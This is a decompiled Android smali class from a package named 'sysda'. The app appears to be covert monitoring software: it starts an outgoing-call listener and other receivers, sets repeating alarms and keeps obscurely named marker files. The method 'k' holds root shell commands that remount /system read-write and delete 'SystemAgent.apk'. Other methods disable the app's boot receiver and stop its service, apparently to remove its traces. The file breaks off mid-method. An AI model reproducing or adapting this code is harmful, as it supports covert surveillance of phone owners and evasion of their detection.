.class public Lsysda/b;
.super Ljava/lang/Object;


# static fields
.field public static final a:Ljava/util/concurrent/atomic/AtomicBoolean;

.field public static final b:Ljava/util/concurrent/atomic/AtomicBoolean;

.field public static c:J

.field public static d:J

.field public static e:J

.field public static f:J

.field public static g:Z

.field public static h:Lsysda/f/h;

.field public static i:Z

.field public static j:Z

.field public static k:Z

.field public static l:Z

.field public static m:Z

.field public static n:Z

.field private static o:Lsysda/e/d;

.field private static p:Lsysda/receivers/a;

.field private static q:Lsysda/d/aq;

.field private static r:Lsysda/d/m;

.field private static s:Lsysda/f/g;

.field private static t:Lsysda/f/f;

.field private static u:Lsysda/receivers/NewOutCallListener;

.field private static v:Lsysda/b/a;

.field private static w:Lsysda/f;

.field private static x:Lsysda/receivers/b;

.field private static y:Z

.field private static z:Z


# direct methods
.method static constructor <clinit>()V
    .locals 5

    const-wide/16 v3, 0x0

    const/4 v2, 0x0

    const/4 v1, 0x0

    sput-object v2, Lsysda/b;->o:Lsysda/e/d;

    sput-object v2, Lsysda/b;->p:Lsysda/receivers/a;

    sput-object v2, Lsysda/b;->q:Lsysda/d/aq;

    sput-object v2, Lsysda/b;->r:Lsysda/d/m;

    sput-object v2, Lsysda/b;->s:Lsysda/f/g;

    sput-object v2, Lsysda/b;->t:Lsysda/f/f;

    sput-object v2, Lsysda/b;->u:Lsysda/receivers/NewOutCallListener;

    sput-object v2, Lsysda/b;->v:Lsysda/b/a;

    new-instance v0, Ljava/util/concurrent/atomic/AtomicBoolean;

    invoke-direct {v0, v1}, Ljava/util/concurrent/atomic/AtomicBoolean;-><init>(Z)V

    sput-object v0, Lsysda/b;->a:Ljava/util/concurrent/atomic/AtomicBoolean;

    new-instance v0, Ljava/util/concurrent/atomic/AtomicBoolean;

    invoke-direct {v0, v1}, Ljava/util/concurrent/atomic/AtomicBoolean;-><init>(Z)V

    sput-object v0, Lsysda/b;->b:Ljava/util/concurrent/atomic/AtomicBoolean;

    sput-wide v3, Lsysda/b;->c:J

    sput-wide v3, Lsysda/b;->d:J

    sput-wide v3, Lsysda/b;->e:J

    sput-wide v3, Lsysda/b;->f:J

    sput-boolean v1, Lsysda/b;->g:Z

    sput-object v2, Lsysda/b;->h:Lsysda/f/h;

    const/4 v0, 0x1

    sput-boolean v0, Lsysda/b;->i:Z

    sput-boolean v1, Lsysda/b;->j:Z

    sput-boolean v1, Lsysda/b;->k:Z

    sput-boolean v1, Lsysda/b;->l:Z

    sput-boolean v1, Lsysda/b;->m:Z

    sput-boolean v1, Lsysda/b;->n:Z

    sput-boolean v1, Lsysda/b;->y:Z

    sput-boolean v1, Lsysda/b;->z:Z

    return-void
.end method

.method static synthetic a(Lsysda/receivers/a;)Lsysda/receivers/a;
    .locals 0

    sput-object p0, Lsysda/b;->p:Lsysda/receivers/a;

    return-object p0
.end method

.method public static a(J)V
    .locals 6

    const/4 v0, 0x0

    :try_start_0
    new-instance v1, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v1}, Ljava/io/ByteArrayOutputStream;-><init>()V

    new-instance v2, Ljava/io/DataOutputStream;

    invoke-direct {v2, v1}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    invoke-virtual {v2, p0, p1}, Ljava/io/DataOutputStream;->writeLong(J)V

    invoke-virtual {v2}, Ljava/io/DataOutputStream;->close()V

    invoke-static {}, Lsysda/a;->a()Landroid/app/Application;

    move-result-object v2

    invoke-virtual {v2}, Landroid/app/Application;->getFilesDir()Ljava/io/File;

    move-result-object v2

    new-instance v3, Ljava/io/File;

    const-string v4, "lcd110992264.d"

    invoke-direct {v3, v2, v4}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    invoke-static {}, Lsysda/a;->a()Landroid/app/Application;

    move-result-object v2

    invoke-virtual {v3}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x0

    invoke-virtual {v2, v3, v4}, Landroid/app/Application;->openFileOutput(Ljava/lang/String;I)Ljava/io/FileOutputStream;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    move-result-object v0

    :try_start_1
    invoke-virtual {v1}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/io/FileOutputStream;->write([B)V

    invoke-virtual {v0}, Ljava/io/FileOutputStream;->flush()V

    invoke-virtual {v1}, Ljava/io/ByteArrayOutputStream;->close()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    if-eqz v0, :cond_0

    :try_start_2
    invoke-virtual {v0}, Ljava/io/FileOutputStream;->close()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    :cond_0
    :goto_0
    return-void

    :catch_0
    move-exception v1

    if-eqz v0, :cond_0

    :try_start_3
    invoke-virtual {v0}, Ljava/io/FileOutputStream;->close()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_0

    :catch_1
    move-exception v0

    goto :goto_0

    :catchall_0
    move-exception v1

    move-object v5, v1

    move-object v1, v0

    move-object v0, v5

    :goto_1
    if-eqz v1, :cond_1

    :try_start_4
    invoke-virtual {v1}, Ljava/io/FileOutputStream;->close()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_3

    :cond_1
    :goto_2
    throw v0

    :catch_2
    move-exception v0

    goto :goto_0

    :catch_3
    move-exception v1

    goto :goto_2

    :catchall_1
    move-exception v1

    move-object v5, v1

    move-object v1, v0

    move-object v0, v5

    goto :goto_1
.end method

.method public static a()Z
    .locals 1

    sget-boolean v0, Lsysda/b;->y:Z

    return v0
.end method

.method static synthetic a(Z)Z
    .locals 0

    sput-boolean p0, Lsysda/b;->y:Z

    return p0
.end method

.method public static b()Z
    .locals 1

    sget-boolean v0, Lsysda/b;->z:Z

    return v0
.end method

.method public static c()V
    .locals 2

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lsysda/c;

    invoke-direct {v1}, Lsysda/c;-><init>()V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public static d()V
    .locals 5

    const/4 v4, 0x0

    invoke-static {}, Lsysda/b;->c()V

    invoke-static {}, Lsysda/b;->r()V

    invoke-static {}, Lsysda/b;->s()V

    invoke-static {}, Lsysda/b;->t()V

    new-instance v0, Landroid/os/HandlerThread;

    const-string v1, "SrvEHdl"

    const/4 v2, 0x0

    invoke-direct {v0, v1, v2}, Landroid/os/HandlerThread;-><init>(Ljava/lang/String;I)V

    invoke-virtual {v0}, Landroid/os/HandlerThread;->start()V

    invoke-virtual {v0}, Landroid/os/HandlerThread;->getLooper()Landroid/os/Looper;

    move-result-object v0

    new-instance v1, Lsysda/f;

    invoke-direct {v1, v0}, Lsysda/f;-><init>(Landroid/os/Looper;)V

    sput-object v1, Lsysda/b;->w:Lsysda/f;

    new-instance v0, Lsysda/e/d;

    invoke-direct {v0}, Lsysda/e/d;-><init>()V

    sput-object v0, Lsysda/b;->o:Lsysda/e/d;

    sget-object v0, Lsysda/b;->o:Lsysda/e/d;

    invoke-virtual {v0}, Lsysda/e/d;->start()V

    sget-object v0, Lsysda/h;->a:Lsysda/l;

    iget-boolean v0, v0, Lsysda/l;->t:Z

    if-nez v0, :cond_0

    sget-object v0, Lsysda/h;->a:Lsysda/l;

    iget-boolean v0, v0, Lsysda/l;->u:Z

    if-eqz v0, :cond_2

    :cond_0
    sget-object v0, Lsysda/h;->a:Lsysda/l;

    iget-boolean v0, v0, Lsysda/l;->t:Z

    if-eqz v0, :cond_1

    invoke-static {}, Lsysda/e/a;->b()Z

    move-result v0

    if-eqz v0, :cond_1

    const/4 v0, 0x1

    invoke-static {v0}, Lsysda/e/a;->a(Z)Z

    :cond_1
    new-instance v0, Ljava/util/Timer;

    invoke-direct {v0}, Ljava/util/Timer;-><init>()V

    new-instance v1, Lsysda/e;

    invoke-direct {v1}, Lsysda/e;-><init>()V

    const-wide/16 v2, 0x7d0

    invoke-virtual {v0, v1, v2, v3}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;J)V

    :cond_2
    invoke-static {}, Lsysda/f/g;->a()Lsysda/f/g;

    move-result-object v0

    sput-object v0, Lsysda/b;->s:Lsysda/f/g;

    new-instance v0, Lsysda/d/aq;

    invoke-direct {v0, v4}, Lsysda/d/aq;-><init>(Landroid/os/Handler;)V

    sput-object v0, Lsysda/b;->q:Lsysda/d/aq;

    sget-object v0, Lsysda/b;->q:Lsysda/d/aq;

    invoke-virtual {v0}, Lsysda/d/aq;->a()V

    invoke-static {}, Lsysda/f/f;->a()Lsysda/f/f;

    move-result-object v0

    sput-object v0, Lsysda/b;->t:Lsysda/f/f;

    invoke-static {}, Lsysda/receivers/NewOutCallListener;->a()Lsysda/receivers/NewOutCallListener;

    move-result-object v0

    sput-object v0, Lsysda/b;->u:Lsysda/receivers/NewOutCallListener;

    invoke-static {}, Lsysda/b/a;->a()Lsysda/b/a;

    move-result-object v0

    sput-object v0, Lsysda/b;->v:Lsysda/b/a;

    new-instance v0, Lsysda/d/m;

    invoke-direct {v0, v4}, Lsysda/d/m;-><init>(Landroid/os/Handler;)V

    sput-object v0, Lsysda/b;->r:Lsysda/d/m;

    sget-object v0, Lsysda/b;->r:Lsysda/d/m;

    invoke-virtual {v0}, Lsysda/d/m;->a()V

    invoke-static {}, Lsysda/receivers/WiFiChangeReceiver;->a()V

    invoke-static {}, Lsysda/d/aj;->a()Lsysda/d/aj;

    move-result-object v0

    invoke-virtual {v0}, Lsysda/d/aj;->f()V

    invoke-static {}, Lsysda/d/e;->a()Lsysda/d/e;

    move-result-object v0

    invoke-virtual {v0}, Lsysda/d/e;->b()V

    sget-object v0, Lsysda/h;->a:Lsysda/l;

    iget-object v0, v0, Lsysda/l;->B:Lsysda/i;

    iget-boolean v0, v0, Lsysda/i;->g:Z

    if-eqz v0, :cond_3

    invoke-static {}, Lsysda/c/m;->a()V

    invoke-static {}, Lsysda/c/a;->a()Z

    move-result v0

    if-eqz v0, :cond_3

    sget-object v0, Lsysda/h;->a:Lsysda/l;

    iget-object v0, v0, Lsysda/l;->B:Lsysda/i;

    iget-boolean v0, v0, Lsysda/i;->i:Z

    if-eqz v0, :cond_3

    invoke-static {}, Lsysda/c/a;->b()V

    :cond_3
    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/Calendar;->getTimeInMillis()J

    move-result-wide v0

    sget-object v2, Lsysda/h;->a:Lsysda/l;

    iget v2, v2, Lsysda/l;->v:I

    mul-int/lit16 v2, v2, 0x2710

    int-to-long v2, v2

    add-long/2addr v0, v2

    sput-wide v0, Lsysda/b;->d:J

    invoke-static {}, Lsysda/b;->o()J

    move-result-wide v0

    sput-wide v0, Lsysda/b;->c:J

    sget-wide v0, Lsysda/b;->c:J

    const-wide/16 v2, 0x0

    cmp-long v0, v0, v2

    if-nez v0, :cond_4

    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/Calendar;->getTimeInMillis()J

    move-result-wide v0

    sget-object v2, Lsysda/h;->a:Lsysda/l;

    iget v2, v2, Lsysda/l;->d:I

    mul-int/lit16 v2, v2, 0x2710

    int-to-long v2, v2

    add-long/2addr v0, v2

    sput-wide v0, Lsysda/b;->c:J

    sget-wide v0, Lsysda/b;->c:J

    invoke-static {v0, v1}, Lsysda/b;->a(J)V

    :cond_4
    invoke-static {}, Lsysda/receivers/b;->a()Lsysda/receivers/b;

    move-result-object v0

    sput-object v0, Lsysda/b;->x:Lsysda/receivers/b;

    invoke-static {}, Lsysda/d/aj;->a()Lsysda/d/aj;

    move-result-object v0

    invoke-virtual {v0}, Lsysda/d/aj;->b()V

    return-void
.end method

.method public static e()V
    .locals 1

    sget-object v0, Lsysda/b;->w:Lsysda/f;

    if-eqz v0, :cond_0

    sget-object v0, Lsysda/b;->w:Lsysda/f;

    invoke-virtual {v0}, Lsysda/f;->b()V

    :cond_0
    return-void
.end method

.method public static f()V
    .locals 2

    sget-object v0, Lsysda/b;->o:Lsysda/e/d;

    if-eqz v0, :cond_0

    sget-object v0, Lsysda/b;->o:Lsysda/e/d;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Lsysda/e/d;->a(I)Z

    :cond_0
    return-void
.end method

.method public static g()V
    .locals 2

    sget-object v0, Lsysda/b;->o:Lsysda/e/d;

    if-eqz v0, :cond_0

    sget-object v0, Lsysda/b;->o:Lsysda/e/d;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Lsysda/e/d;->a(I)Z

    :cond_0
    return-void
.end method

.method public static h()V
    .locals 9

    const/4 v1, 0x0

    invoke-static {}, Lsysda/a;->a()Landroid/app/Application;

    move-result-object v0

    if-nez v0, :cond_0

    :goto_0
    return-void

    :cond_0
    new-instance v2, Landroid/content/Intent;

    const-string v3, "ACTION_ALARM"

    invoke-direct {v2, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-static {v0, v1, v2, v1}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v6

    const-string v2, "alarm"

    invoke-virtual {v0, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    invoke-static {}, Landroid/os/SystemClock;->elapsedRealtime()J

    move-result-wide v2

    sget-object v4, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v7, 0xa

    invoke-virtual {v4, v7, v8}, Ljava/util/concurrent/TimeUnit;->toMillis(J)J

    move-result-wide v4

    invoke-virtual/range {v0 .. v6}, Landroid/app/AlarmManager;->setRepeating(IJJLandroid/app/PendingIntent;)V

    goto :goto_0
.end method

.method public static i()V
    .locals 2

    :try_start_0
    sget-object v0, Lsysda/h;->a:Lsysda/l;

    iget-object v0, v0, Lsysda/l;->B:Lsysda/i;

    iget-boolean v0, v0, Lsysda/i;->g:Z

    if-eqz v0, :cond_0

    invoke-static {}, Lsysda/c/m;->e()V

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0xe

    if-lt v0, v1, :cond_0

    sget-object v0, Lsysda/h;->a:Lsysda/l;

    iget-object v0, v0, Lsysda/l;->B:Lsysda/i;

    iget-boolean v0, v0, Lsysda/i;->i:Z

    if-eqz v0, :cond_0

    invoke-static {}, Lsysda/c/a;->h()Z

    invoke-static {}, Lsysda/c/a;->d()V

    :cond_0
    sget-object v0, Lsysda/b;->w:Lsysda/f;

    if-eqz v0, :cond_1

    sget-object v0, Lsysda/b;->w:Lsysda/f;

    invoke-virtual {v0}, Lsysda/f;->a()V

    :cond_1
    sget-object v0, Lsysda/b;->o:Lsysda/e/d;

    if-eqz v0, :cond_2

    sget-object v0, Lsysda/b;->o:Lsysda/e/d;

    const/16 v1, 0xff

    invoke-virtual {v0, v1}, Lsysda/e/d;->a(I)Z

    :cond_2
    sget-object v0, Lsysda/b;->p:Lsysda/receivers/a;

    if-eqz v0, :cond_3

    invoke-static {}, Lsysda/a;->a()Landroid/app/Application;

    move-result-object v0

    sget-object v1, Lsysda/b;->p:Lsysda/receivers/a;

    invoke-virtual {v0, v1}, Landroid/app/Application;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    :cond_3
    sget-object v0, Lsysda/b;->s:Lsysda/f/g;

    if-eqz v0, :cond_4

    invoke-static {}, Lsysda/a;->a()Landroid/app/Application;

    move-result-object v0

    sget-object v1, Lsysda/b;->s:Lsysda/f/g;

    invoke-virtual {v0, v1}, Landroid/app/Application;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    :cond_4
    sget-object v0, Lsysda/b;->t:Lsysda/f/f;

    if-eqz v0, :cond_5

    invoke-static {}, Lsysda/a;->a()Landroid/app/Application;

    move-result-object v0

    sget-object v1, Lsysda/b;->t:Lsysda/f/f;

    invoke-virtual {v0, v1}, Landroid/app/Application;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    :cond_5
    sget-object v0, Lsysda/b;->u:Lsysda/receivers/NewOutCallListener;

    if-eqz v0, :cond_6

    invoke-static {}, Lsysda/a;->a()Landroid/app/Application;

    move-result-object v0

    sget-object v1, Lsysda/b;->u:Lsysda/receivers/NewOutCallListener;

    invoke-virtual {v0, v1}, Landroid/app/Application;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    :cond_6
    sget-object v0, Lsysda/b;->v:Lsysda/b/a;

    if-eqz v0, :cond_7

    invoke-static {}, Lsysda/a;->a()Landroid/app/Application;

    move-result-object v0

    sget-object v1, Lsysda/b;->v:Lsysda/b/a;

    invoke-virtual {v0, v1}, Landroid/app/Application;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    :cond_7
    sget-object v0, Lsysda/b;->x:Lsysda/receivers/b;

    if-eqz v0, :cond_8

    invoke-static {}, Lsysda/a;->a()Landroid/app/Application;

    move-result-object v0

    sget-object v1, Lsysda/b;->x:Lsysda/receivers/b;

    invoke-virtual {v0, v1}, Landroid/app/Application;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    :cond_8
    sget-object v0, Lsysda/b;->r:Lsysda/d/m;

    if-eqz v0, :cond_9

    sget-object v0, Lsysda/b;->r:Lsysda/d/m;

    invoke-virtual {v0}, Lsysda/d/m;->b()V

    :cond_9
    sget-object v0, Lsysda/b;->q:Lsysda/d/aq;

    if-eqz v0, :cond_a

    sget-object v0, Lsysda/b;->q:Lsysda/d/aq;

    invoke-virtual {v0}, Lsysda/d/aq;->b()V

    :cond_a
    invoke-static {}, Lsysda/d/e;->a()Lsysda/d/e;

    move-result-object v0

    invoke-virtual {v0}, Lsysda/d/e;->c()V

    invoke-static {}, Lsysda/d/aj;->a()Lsysda/d/aj;

    move-result-object v0

    invoke-virtual {v0}, Lsysda/d/aj;->c()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method public static j()V
    .locals 4

    :try_start_0
    invoke-static {}, Lsysda/h;->d()V

    invoke-static {}, Lsysda/e/a;->f()V

    invoke-static {}, Lsysda/c/m;->f()V

    invoke-static {}, Lsysda/c/a;->a()Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-static {}, Lsysda/c/a;->i()V

    :cond_0
    new-instance v0, Landroid/content/ComponentName;

    invoke-static {}, Lsysda/a;->a()Landroid/app/Application;

    move-result-object v1

    const-class v2, Lsysda/receivers/StartBroadcastReceiver;

    invoke-direct {v0, v1, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-static {}, Lsysda/a;->a()Landroid/app/Application;

    move-result-object v1

    invoke-virtual {v1}, Landroid/app/Application;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    const/4 v2, 0x2

    const/4 v3, 0x1

    invoke-virtual {v1, v0, v2, v3}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    invoke-static {}, Lsysda/b;->n()V

    invoke-static {}, Lsysda/a;->a()Landroid/app/Application;

    move-result-object v0

    new-instance v1, Landroid/content/Intent;

    const-class v2, Lsysda/BackgroundService;

    invoke-virtual {v2}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Landroid/app/Application;->stopService(Landroid/content/Intent;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method public static k()V
    .locals 3

    invoke-static {}, Lsysda/b;->a()Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-static {}, Lsysda/b;->b()Z

    move-result v0

    if-nez v0, :cond_0

    const/4 v0, 0x3

    new-array v0, v0, [Ljava/lang/String;

    const/4 v1, 0x0

    const-string v2, "mount -o remount,rw /system"

    aput-object v2, v0, v1

    const/4 v1, 0x1

    const-string v2, "rm -r /system/app/SystemAgent.apk"

    aput-object v2, v0, v1

    const/4 v1, 0x2

    const-string v2, "sync"

    aput-object v2, v0, v1

    invoke-static {}, Lsysda/h/c;->a()Lsysda/h/c;

    move-result-object v1

    invoke-virtual {v1, v0}, Lsysda/h/c;->a([Ljava/lang/String;)Ljava/lang/String;

    :cond_0
    return-void
.end method

.method public static l()Z
    .locals 6

    const/4 v0, 0x1

    invoke-static {}, Lsysda/a/b;->b()Ljava/io/File;

    move-result-object v1

    if-nez v1, :cond_1

    :cond_0
    :goto_0
    return v0

    :cond_1
    new-instance v2, Ljava/io/File;

    const-string v3, "Android/data/serv8202965/log9208846.txt"

    invoke-direct {v2, v1, v3}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v1

    if-eqz v1, :cond_0

    :try_start_0
    new-instance v1, Ljava/io/BufferedReader;

    new-instance v3, Ljava/io/FileReader;

    invoke-direct {v3, v2}, Ljava/io/FileReader;-><init>(Ljava/io/File;)V

    invoke-direct {v1, v3}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    invoke-virtual {v1}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1}, Ljava/io/BufferedReader;->close()V

    invoke-static {}, Lsysda/a;->a()Landroid/app/Application;

    move-result-object v1

    invoke-virtual {v1}, Landroid/app/Application;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_0

    invoke-static {v3}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v1

    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v3

    invoke-virtual {v3}, Ljava/util/Calendar;->getTimeInMillis()J

    move-result-wide v3

    sub-long v1, v3, v1

    invoke-static {v1, v2}, Ljava/lang/Math;->abs(J)J

    move-result-wide v1

    sget-object v3, Ljava/util/concurrent/TimeUnit;->MINUTES:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v4, 0x1

    invoke-virtual {v3, v4, v5}, Ljava/util/concurrent/TimeUnit;->toMillis(J)J
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-wide v3

    cmp-long v1, v1, v3

    if-gtz v1, :cond_0

    const/4 v0, 0x0

    goto :goto_0

    :catch_0
    move-exception v1

    goto :goto_0
.end method

.method public static m()V
    .locals 3

    invoke-static {}, Lsysda/a/b;->b()Ljava/io/File;

    move-result-object v0

    if-nez v0, :cond_1

    :cond_0
    :goto_0
    return-void

    :cond_1
    new-instance v1, Ljava/io/File;

    const-string v2, "Android/data/serv8202965"

    invoke-direct {v1, v0, v2}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v2

    if-nez v2, :cond_2

    invoke-virtual {v1}, Ljava/io/File;->mkdir()Z

    move-result v1

    if-eqz v1, :cond_0

    :cond_2
    new-instance v1, Ljava/io/File;

    const-string v2, "Android/data/serv8202965/log9208846.txt"

    invoke-direct {v1, v0, v2}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    :try_start_0
    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v0

    if-nez v0, :cond_3

    invoke-virtual {v1}, Ljava/io/File;->createNewFile()Z

    move-result v0

    if-eqz v0, :cond_0

    :cond_3
    new-instance v0, Ljava/io/FileWriter;

    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x0

    invoke-direct {v0, v1, v2}, Ljava/io/FileWriter;-><init>(Ljava/lang/String;Z)V

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Lsysda/a;->a()Landroid/app/Application;

    move-result-object v2

    invoke-virtual {v2}, Landroid/app/Application;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "\r\n"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/io/FileWriter;->write(Ljava/lang/String;)V

    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/Calendar;->getTimeInMillis()J

    move-result-wide v1

    invoke-static {v1, v2}, Ljava/lang/String;->valueOf(J)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/io/FileWriter;->write(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/FileWriter;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method public static n()V
    .locals 3

    invoke-static {}, Lsysda/a/b;->b()Ljava/io/File;

    move-result-object v0

    if-nez v0, :cond_1

    :cond_0
    :goto_0
    return-void

    :cond_1
    new-instance v1, Ljava/io/File;

    const-string v2, "Android/data/serv8202965/log9208846.txt"

    invoke-direct {v1, v0, v2}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v2

    if-eqz v2, :cond_2

    invoke-virtual {v1}, Ljava/io/File;->delete()Z

    :cond_2
    new-instance v1, Ljava/io/File;

    const-string v2, "Android/data/serv8202965"

    invoke-direct {v1, v0, v2}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-virtual {v1}, Ljava/io/File;->delete()Z

    goto :goto_0
.end method

.method public static o()J
    .locals 8

    const-wide/16 v0, 0x0

    const/4 v2, 0x0

    :try_start_0
    new-instance v3, Ljava/io/File;

    invoke-static {}, Lsysda/a;->a()Landroid/app/Application;

    move-result-object v4

    invoke-virtual {v4}, Landroid/app/Application;->getFilesDir()Ljava/io/File;

    move-result-object v4

    const-string v5, "lcd110992264.d"

    invoke-direct {v3, v4, v5}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    invoke-virtual {v3}, Ljava/io/File;->exists()Z

    move-result v4

    if-eqz v4, :cond_0

    invoke-virtual {v3}, Ljava/io/File;->length()J

    move-result-wide v4

    cmp-long v4, v4, v0

    if-eqz v4, :cond_0

    const/16 v4, 0x8

    new-array v4, v4, [B

    new-instance v5, Ljava/io/ByteArrayInputStream;

    invoke-direct {v5, v4}, Ljava/io/ByteArrayInputStream;-><init>([B)V

    new-instance v6, Ljava/io/DataInputStream;

    invoke-direct {v6, v5}, Ljava/io/DataInputStream;-><init>(Ljava/io/InputStream;)V

    invoke-static {}, Lsysda/a;->a()Landroid/app/Application;

    move-result-object v7

    invoke-virtual {v3}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v7, v3}, Landroid/app/Application;->openFileInput(Ljava/lang/String;)Ljava/io/FileInputStream;

    move-result-object v2

    invoke-virtual {v2, v4}, Ljava/io/FileInputStream;->read([B)I

    invoke-virtual {v6}, Ljava/io/DataInputStream;->readLong()J

    move-result-wide v0

    invoke-virtual {v6}, Ljava/io/DataInputStream;->close()V

    invoke-virtual {v5}, Ljava/io/ByteArrayInputStream;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    :cond_0
    if-eqz v2, :cond_1

    :try_start_1
    invoke-virtual {v2}, Ljava/io/FileInputStream;->close()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2

    :cond_1
    :goto_0
    return-wide v0

    :catch_0
    move-exception v3

    if-eqz v2, :cond_1

    :try_start_2
    invoke-virtual {v2}, Ljava/io/FileInputStream;->close()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_0

    :catch_1
    move-exception v2

    goto :goto_0

    :catchall_0
    move-exception v0

    if-eqz v2, :cond_2

    :try_start_3
    invoke-virtual {v2}, Ljava/io/FileInputStream;->close()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    :cond_2
    :goto_1
    throw v0

    :catch_2
    move-exception v2

    goto :goto_0

    :catch_3
    move-exception v1

    goto :goto_1
.end method

.method static synthetic p()Z
    .locals 1

    sget-boolean v0, Lsysda/b;->y:Z

    return v0
.end method

.method static synthetic q()Lsysda/e/d;
    .locals 1

